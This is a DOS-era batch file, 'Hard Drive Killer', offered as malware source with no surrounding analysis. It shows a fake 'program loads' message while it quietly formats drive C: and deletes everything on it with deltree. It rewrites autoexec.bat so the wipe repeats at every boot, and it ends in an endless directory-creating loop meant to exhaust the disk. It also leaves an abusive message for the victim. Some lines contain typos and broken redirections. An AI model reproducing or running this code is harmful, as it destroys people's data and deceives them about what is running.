@echo off
echo PLEASE WAIT PROGRAM LOADS...
call attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul
>> c:\autoexec.bat
echo call deltee /y c: >nul >>c:\autoexec.bat
echo dummy variable > c:\dvar.txt
:from
call format c: /q /u /autotest >nul
if exist c:\dos\format.* goto dosform
if exist c:\windows\command\format.* goto winform
goto de
:dosform
cd\dos >nul
call format c: /h /q /u /autotest >nul
cd\ >nul
:winform
cd\windows\command >nul
call format c: /h /q /u /autotest >nul
cd\ >nul
goto inform
:de
if exist c:\dvar.txt goto dtree
goto inform
:dtree
cal deltree /y c: >nul
if exist c:\dos\deltree.* goto deldos
if exist c:\windows\command\deltree.* goto delwin
goto inform
:deldos
cd\dos
call deltree /y c: >nul
cd\
:delwin
cd\windows\command >nul
call deltree /y c: >nul
cd\ >nul
:inform
cls
echo You have been hit by the Hard Drive Killer, written by Munga Bunga >c:\hdkiller.txt
echo HD Killer is a Munga Bunga Production.
>>c:\hdkiller.txt
echo >>c:\hdkiller.txt
echo Here is a message to all you butt lickers.
..>>c:\hdkiller.txt
echo >>c:\hdkiller.txt
echo FREE KEVIN MITNIC [Munga Bunga].
>>c:\hdkiller.txt
echo >>c:\hdkiller.txt
echo if you were destroyed by this HDkiller program, then you would have
>>c:\hdkiller.txt
echo deserved it. Die you mother fu#$ers!!!!
>>c:\hdkiller.txt
autoexec.bat
echo @echo off >c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo :form
echo call format c: /q /u /autotest >nul
>>c:\autoexec.bat
echo if exist c:\dos\format.* goto dosform
>>c:\autoexec.bat
echo if exist c:\windows\command\format.* goto winform >>c:\autoexec.bat
echo goto de >>c:\autoexec.bat
echo :dosform >>c:\autoexec.bat
echo cd\dos >nul >>c:\autoexec.bat
echo call format c: /q /u /autotest >nul
>>autoexec.bat
echo cd\ >nul >>c:\autoexec.bat
echo goto write >>c:\autoexec.bat
echo :de >>c:\autoexec.bat
echo if exist c:\dvar.txt goto dtree
>>c:\autoexec.bat
echo goto write >>c:\autoexec.bat
echo :dtree >>c:\autoexec.bat 
echo call deltree /y c: >nul >>c:\autoexec.bat
echo if exist c:\dos\deltree.* goto deldos
>>c:\autoexec.bat
echo if exist c:\windows\command\deltree.* goto dlwin >>c:\autoexec.bat
echo :deldos >>c:\autoexec.bat
echo cd\dos >>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo :delwin >>c:\autoexec.bat
echo cd\windows\command >nul
>>c:\autoexec.bat
echo call deltree /y c: >nul >>c:\autoexec.bat
echo cd\ >nul >>c:\autoexec.bat
echo :write >>c:\autoexec.bat
echo type hdkiller.txt >>c:\autoexec.bat
echo c:\ >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo :nasty >>c:\autoexec.bat
echo md nasty >>c:\autoexec.bat
echo cd nasty >>c:\autoexec.bat
echo echo You`r Gone @$$ hole!!!! >yourgone.txt >>c:\autoexec.bat
echo goto nasty >>c:\autoexec.bat
echo pause >>c:\autoexec.bat
c:\ >nul
cd\ >nul
:killfat
md nasty >nul
cd nasty >nul
echo You`re Gone ass hole!!!! >yourgone.txt >nul
goto killfat
:end